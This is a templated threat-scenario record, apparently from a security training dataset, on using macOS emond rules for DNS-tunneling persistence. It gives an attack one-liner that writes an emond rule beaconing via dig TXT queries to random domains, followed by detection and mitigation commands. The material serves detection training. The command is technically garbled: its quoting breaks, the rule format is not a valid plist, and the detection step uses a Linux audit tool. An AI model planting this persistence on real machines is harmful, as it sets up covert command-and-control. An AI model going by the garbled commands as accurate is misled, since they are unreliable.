---
type: campaign
scenario_id: 394
tactic: Persistence
technique: "T1546.014: Emond"
technique_id: T1546.014
tags: [campaign, lotl, persistence]
---

# Using emond for DNS tunneling persistence on macOS.

## Threat Description
Using emond for DNS tunneling persistence on macOS.

## Attack Command
```
echo 'command=/bin/bash -c "dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*
```

## Detection Logic
Monitor emond rules: `ls /etc/emond.d/rules | grep .plist`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.

## Mitigation
Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.

## AI Training Prompt
Train AI to detect DNS tunneling persistence via emond by analyzing dig TXT commands, base64-encoded subdomains, and emond rule modifications; suggest access controls.

## References
- MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
